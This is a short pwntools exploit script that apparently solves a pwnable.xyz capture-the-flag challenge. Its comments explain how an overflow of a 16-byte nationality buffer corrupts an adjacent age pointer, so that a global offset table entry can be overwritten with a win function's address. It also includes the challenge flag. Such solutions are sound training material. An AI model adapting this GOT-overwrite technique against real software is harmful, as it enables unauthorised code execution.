from pwn import *

# We can see from checksec that only partial RELRO is enabled so we can overwrite the global offset table
# The way that variables are arranged on the stack, it looks like:
# nationality_var -> 16 bytes
# age_var -> 8 bytes
# scanf() from the nationality part of the program reads 24 bytes into nationality_var, which allows us to overwrite the value for age_var
# Finally, scanf() in the age part of the program passes age_var the value instead of the pointer
def main():
    LOCAL = False
    if LOCAL:
        r = ELF('./challenge')
        r = r.process()
    else:
        r = remote('svc.pwnable.xyz', 30031) 
  
    r.recvuntil("> ")
    r.sendline("2") # Nationality
    r.recvuntil("nationality: ")
    puts_got_addr = 0x603020
    nationality_payload = b'A' * 16 + b'\x78\x30\x60'
    print(nationality_payload)
    r.sendline(nationality_payload)
    
    l = r.recvuntil("> ")
    r.sendline("3") # Age
    r.recvuntil("age: ")
    win_addr = 0x40099c # 4196764
    win_addr = 4196764
    age_payload = b'\x9c\x09\x40'
    print(age_payload)
    l = r.sendline(str(win_addr))
    print("Line is: ", l)
    #gdb.attach(r)
    #r.interactive()

    r.recvuntil("> ")
    r.sendline("a")
    r.interactive()
    # FLAG{now_try_the_2nd_solution}




if __name__ == '__main__':
    main()
